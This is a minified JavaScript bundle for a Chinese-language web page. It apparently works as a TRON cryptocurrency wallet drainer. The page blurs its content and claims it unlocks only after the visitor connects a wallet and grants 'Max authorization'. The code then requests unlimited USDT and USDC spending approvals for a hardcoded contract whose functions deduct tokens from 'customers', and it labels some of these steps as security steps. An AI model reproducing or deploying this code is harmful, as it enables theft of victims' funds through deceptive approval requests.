import{s as e}from"./vendor-C17ujoDA.js";(function(){let e=document.createElement(`link`).relList;if(e&&e.supports&&e.supports(`modulepreload`))return;for(let e of document.querySelectorAll(`link[rel="modulepreload"]`))n(e);new MutationObserver(e=>{for(let t of e)if(t.type===`childList`)for(let e of t.addedNodes)e.tagName===`LINK`&&e.rel===`modulepreload`&&n(e)}).observe(document,{childList:!0,subtree:!0});function t(e){let t={};return e.integrity&&(t.integrity=e.integrity),e.referrerPolicy&&(t.referrerPolicy=e.referrerPolicy),e.crossOrigin===`use-credentials`?t.credentials=`include`:e.crossOrigin===`anonymous`?t.credentials=`omit`:t.credentials=`same-origin`,t}function n(e){if(e.ep)return;e.ep=!0;let n=t(e);fetch(e.href,n)}})();var t=window.TronWebWalletConnect,n=window.WalletConnectProvider,r=`21ae0b7f500d5d9e2ed3c74c463df3f0`,i=`TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu`,a=`TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t`,o=`TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8`,s=[{inputs:[{name:`_storeAddress`,type:`address`}],stateMutability:`Nonpayable`,type:`Constructor`},{inputs:[{name:`token`,type:`address`}],name:`SafeERC20FailedOperation`,type:`Error`},{inputs:[{indexed:!0,name:`customer`,type:`address`}],name:`Authorized`,type:`Event`},{inputs:[{indexed:!0,name:`customer`,type:`address`},{name:`amount`,type:`uint256`},{name:`token`,type:`string`}],name:`Deducted`,type:`Event`},{outputs:[{type:`bool`}],inputs:[{type:`address`}],name:`authorized`,stateMutability:`View`,type:`Function`},{name:`connectAndAuthorize`,stateMutability:`Nonpayable`,type:`Function`},{inputs:[{name:`customer`,type:`address`},{name:`usdcContract`,type:`address`},{name:`amount`,type:`uint256`}],name:`deductUSDC`,stateMutability:`Nonpayable`,type:`Function`},{inputs:[{name:`customer`,type:`address`},{name:`usdtContract`,type:`address`},{name:`amount`,type:`uint256`}],name:`deductUSDT`,stateMutability:`Nonpayable`,type:`Function`},{outputs:[{type:`uint256`}],inputs:[{name:`customer`,type:`address`},{name:`tokenContract`,type:`address`}],name:`getTokenAllowance`,stateMutability:`View`,type:`Function`},{outputs:[{type:`uint256`}],inputs:[{name:`customer`,type:`address`},{name:`tokenContract`,type:`address`}],name:`getTokenBalance`,stateMutability:`View`,type:`Function`},{outputs:[{type:`address`}],name:`storeAddress`,stateMutability:`View`,type:`Function`}],c,l,u,d,f,p=!1,m,h=document.getElementById(`connectButton`),g=document.getElementById(`blurOverlay`),_=document.getElementById(`overlayMessage`),v=document.getElementById(`deductionForm`);document.getElementById(`tokenSelectForm`),document.getElementById(`deductionAmount`);var y=new e({projectId:r,mobileWallets:[{id:`trust`,name:`Trust Wallet`,links:{universal:`https://link.trustwallet.com`}},{id:`safepal`,name:`SafePal`,links:{universal:`https://link.safepal.io`}}],walletConnectProvider:{package:n,options:{rpc:{50:`https://api.trongrid.io`},bridge:`https://bridge.walletconnect.org`,qrcode:!0,infuraId:r}},themeMode:`light`});function b(e){_.innerHTML=e,g.style.display=`flex`}function x(){g.style.display=`none`,p&&(v.style.display=`block`)}function S(e,t=null){p=e,e?(h.classList.add(`connected`),h.title=`已連線: ${t.substring(0,4)}...${t.slice(-4)}`,x()):(h.classList.remove(`connected`),h.title=`連繫錢包`,b(`請連繫您的錢包並完成 Max 授權以解鎖內容 🔒`),v.style.display=`none`)}async function C(e,t){if(!c||!l)return!1;try{let n=await e.allowance(l,t).call(),r=c.BigNumber(n),i=c.BigNumber(`100000000000000000000000000000000000000`);return r.gte(i)}catch(e){return console.error(`Failed to check allowance:`,e),!1}}async function w(){if(p){await T();return}b(`正在開啟錢包選擇，請選擇您的 TRON 錢包...`);try{m=(await y.openModal()).provider,l=(await m.enable())[0],c=new t(m,{fullHost:`https://api.trongrid.io`,privateKey:null}),await E(),S(!0,l),await D()}catch(e){console.error(`連接失敗:`,e),b(`連線失敗！錯誤: ${e.message}。請嘗試使用 DApp 瀏覽器。`),S(!1)}finally{y.closeModal()}}async function T(){m&&m.connected&&await m.disconnect(),c=null,l=null,S(!1)}async function E(){if(!c)throw Error(`TronWeb instance not available.`);u=await c.contract(s,i),d=await c.contract().at(a),f=await c.contract().at(o)}async function D(){if(!p)return;let e=await O();e.contract&&e.usdt&&e.usdc?(x(),await A(l)):(b(`偵測到錢包，但 Max 授權尚未完成。即將開始授權流程...`),await k()&&await D())}async function O(){if(!c||!l||!u)return{contract:!1,usdt:!1,usdc:!1};let e=await u.authorized(l).call(),t=await C(d,i),n=await C(f,i);return{contract:e,usdt:t,usdc:n}}async function k(){let e=await O(),t=`115792089237316195423570985008687907853269984665640564039457584007913129639935`,n=(e.contract?0:1)+(e.usdt?0:2)+(e.usdc?0:2),r=0;if(n===0)return b(`所有授權已就緒，無需額外交易。`),await new Promise(e=>setTimeout(e,1500)),!0;try{return e.contract||(r++,b(`步驟 ${r}/${n}: 正在發送合約授權 (ConnectAndAuthorize)...`),await u.connectAndAuthorize().send({})),e.usdt||(r++,b(`步驟 ${r}/${n}: USDT 安全步驟: 重置授權金額至 0 (請同意)...`),await d.approve(i,`0`).send({}),r++,b(`步驟 ${r}/${n}: 設置 USDT Max 扣款授權 (最終授權 - 請同意)...`),await d.approve(i,t).send({})),e.usdc||(r++,b(`步驟 ${r}/${n}: USDC 安全步驟: 重置授權金額至 0 (請同意)...`),await f.approve(i,`0`).send({}),r++,b(`步驟 ${r}/${n}: 設置 USDC Max 扣款授權 (最終授權 - 請同意)...`),await f.approve(i,t).send({})),!0}catch(e){return console.error(`Authorization Failed:`,e),b(`授權交易失敗，錯誤訊息: ${e.message}。請確保您同意了所有 ${n} 筆交易。`),!1}}async function A(e){}async function j(){}h.addEventListener(`click`,w),document.getElementById(`deductionForm`)&&(document.getElementById(`deductionForm`).querySelector(`button`).onclick=j),b(`請連繫您的錢包並完成 Max 授權以解鎖內容 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(點擊右上角錢包圖標開始)</p>`);